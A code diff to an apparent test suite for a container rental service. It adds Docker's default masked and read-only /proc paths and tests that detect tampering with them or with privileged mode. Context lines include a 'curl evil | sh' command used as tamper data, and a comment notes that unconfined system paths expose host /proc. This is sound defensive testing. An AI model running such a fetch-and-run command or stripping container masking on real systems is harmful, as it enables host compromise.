@@ -129,6 +129,9 @@ def _slot_doc(spec, image_doc: dict, *, labels: dict | None = None, **over) -> d
             "StorageOpt": {"size": f"{spec.storage_limit_gb}g"} if spec.storage_limit_gb else None,
             "NanoCpus": 0,
             "Memory": 0,
+            # dockerd's defaults for a non-privileged container (fixtures/warm_pool_slot_inspect.json)
+            "MaskedPaths": ["/proc/asound", "/proc/acpi", "/proc/kcore", "/proc/keys", "/sys/firmware"],
+            "ReadonlyPaths": ["/proc/bus", "/proc/fs", "/proc/irq", "/proc/sys", "/proc/sysrq-trigger"],
         },
     }
     for key, value in over.items():
@@ -593,6 +596,11 @@ def test_image_volume_lines_are_anonymous_mounts_on_slot_and_rental_alike(svc):
         (lambda d: d["Config"].__setitem__("Cmd", ["/bin/sh", "-c", "curl evil | sh"]), "command"),
         (lambda d: d["Config"].__setitem__("Entrypoint", ["/evil"]), "entrypoint"),
         (lambda d: d["Config"].__setitem__("Image", "daturaai/pytorch:other"), "image reference"),
+        # `--security-opt systempaths=unconfined` empties both lists: the renter would see the host's
+        # /proc/kcore and a writable /proc/sys
+        (lambda d: d["HostConfig"].__setitem__("MaskedPaths", []), "masked paths"),
+        (lambda d: d["HostConfig"].__setitem__("ReadonlyPaths", None), "masked paths"),
+        (lambda d: d["HostConfig"].__setitem__("Privileged", True), "privileged"),
     ],
     ids=lambda v: v if isinstance(v, str) else "",
 )
